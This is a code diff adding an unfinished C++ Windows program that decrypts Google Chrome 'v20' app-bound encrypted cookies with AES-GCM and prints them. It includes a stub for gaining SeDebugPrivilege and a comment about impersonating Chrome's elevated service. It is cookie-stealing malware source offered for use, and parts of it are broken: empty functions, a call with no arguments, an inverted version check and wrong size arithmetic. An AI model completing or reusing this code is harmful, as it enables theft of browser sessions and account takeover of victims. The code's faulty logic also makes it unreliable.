@@ -1,0 +1,111 @@
+#include <windows.h>
+#include <ntstatus.h>
+#include <bcrypt.h>
+#include <stdio.h>
+
+typedef struct {
+    PBYTE ptr;
+    ULONG size;
+} MM_RANGE;
+
+auto GetSystem( VOID ) -> HANDLE {
+    ULONG Priv   = SE_DEBUG_PRIVILEGE;
+    LONG  Status = STATUS_SUCCESS;
+
+    
+    AdjustTokenPrivileges(  )
+}
+
+auto AesGcmDec( 
+    MM_RANGE* Key, 
+    MM_RANGE* Tag,
+    MM_RANGE* Nonce,
+    MM_RANGE* CipherTxt
+) -> BOOL {
+    LONG  Status  = 0;
+    ULONG TxtSize = 0;
+
+    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO CipherInfo = { 0 };
+
+    BCRYPT_KEY_DATA_BLOB_HEADER* KeyBlob = { 0 };
+
+    BCRYPT_ALG_HANDLE AlgHandle = 0;
+    BCRYPT_KEY_HANDLE KeyHandle = 0;
+
+    BYTE  Buffer[AES_KEY_BLOB_SIZE]  = { 0 };
+
+    Status = BCryptOpenAlgorithmProvider( &AlgHandle, BCRYPT_AES_ALGORITHM, 0, 0 );
+    if ( Status != STATUS_SUCCESS ) {
+        printf("failed to open alg provider: 0x%X\n", Status); return FALSE;
+    }
+
+    do {
+        Status = BCryptSetProperty( AlgHandle, BCRYPT_CHAINING_MODE, (UCHAR*)BCRYPT_CHAIN_MODE_GCM, sizeof( BCRYPT_CHAIN_MODE_GCM ), 0 );
+        if ( Status != STATUS_SUCCESS ) { printf("failed to set property: 0x%X\n", Status); break; }
+
+        KeyBlob = Buffer;
+        KeyBlob->cbKeyData = Key->size;
+        KeyBlob->dwMagic   = BCRYPT_KEY_DATA_BLOB_MAGIC;
+        KeyBlob->dwVersion = 1;
+
+        memcpy( Buffer + sizeof( BCRYPT_KEY_DATA_BLOB_HEADER ), Key->ptr, Key->size );
+
+        Status = BCryptImportKey( AlgHandle, 0, BCRYPT_KEY_DATA_BLOB, &KeyHandle, 0, 0, Buffer, sizeof( Buffer ), 0 );
+        if ( Status != STATUS_SUCCESS ) { printf("failed to import key: 0x%X", Status); break; }
+
+        BCRYPT_INIT_AUTH_MODE_INFO( CipherInfo );
+
+        CipherInfo.cbNonce = Nonce->size;
+        CipherInfo.pbNonce = Nonce->ptr;
+        CipherInfo.cbTag   = Tag->size;
+        CipherInfo.pbTag   = Tag->ptr;
+
+        Status = BCryptDecrypt( KeyHandle, CipherTxt->ptr, CipherTxt->size, &CipherInfo, 0, 0, CipherTxt->ptr, CipherTxt->size, &CipherTxt->size, 0 );
+        if ( Status != STATUS_SUCCESS ) { printf("failed to decrypt: 0x%X", Status); break; }
+
+    } while( 0 );
+
+    if ( KeyHandle != 0 ) BCryptDestroyKey( KeyHandle );
+
+    BCryptCloseAlgorithmProvider( AlgHandle, 0 );
+
+    return ( Status == STATUS_SUCCESS ? TRUE : FALSE );
+}
+
+auto ShowSecret( 
+    MM_RANGE Key, 
+    MM_RANGE Data
+) -> VOID {
+    BYTE Version[] = { 'v', '2', '0' };
+
+    auto Tag       = MM_RANGE{ nullptr, 16 };
+    auto Nonce     = MM_RANGE{ nullptr, 12 };
+    auto CipherTxt = MM_RANGE{ nullptr, 0 };
+
+    if ( ! memcmp( Data.ptr, Version, sizeof( Version ) ) ) {
+        printf("unsupported version\n"); return;
+    }
+
+    Nonce.ptr = ( Data.ptr + sizeof( Version ) );
+    Tag.ptr   = ( Data.ptr + Data.size - 16 );
+
+    CipherTxt.ptr  = ( Data.ptr  + sizeof( Version ) + 12 );
+    CipherTxt.size = ( Data.size - sizeof( Version ) + 12 + 16 );
+
+    if ( AesGcmDec( &Key, &Tag, &Nonce, &CipherTxt ) ) {
+        printf("Cookie: %.*hS\n\n", CipherTxt.size - 32, CipherTxt.ptr + 32);
+    }
+} 
+
+auto __stdcall WinMain(
+    HINSTANCE Instance,
+    HINSTANCE PrevInstance,
+    CHAR*     CommandLine,
+    INT32     ShowCmd
+) -> INT32 {
+    LONG Method = 0; // 1 = replicate chrome elevated service
+                     // 2 = default method, needed use chrome process or write your binary on chrome path
+
+
+}
+
